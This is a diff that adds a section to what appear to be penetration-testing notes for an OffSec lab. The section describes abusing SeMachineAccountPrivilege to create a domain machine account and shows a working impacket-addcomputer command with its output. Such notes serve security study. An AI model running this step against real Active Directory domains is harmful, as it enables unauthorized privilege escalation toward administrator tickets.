@@ -205,6 +205,25 @@ PS> systeminfo
 
 
 
+### SeMachineAccountPrivilege
+
+This privilege allows us to create a machine account on the domain ($). We can use this machine account to impersonate another user and request a ticket-granting-ticket (Administrator).
+
+
+
+#### create new computer account - impacket
+
+```shell-session
+impacket-addcomputer heist.offsec/enox -dc-ip 192.168.191.165 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!' 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
+
+```
+
+####
+
 SeDebugPrivilege
 
 SeTakeOwnershipPrivilege
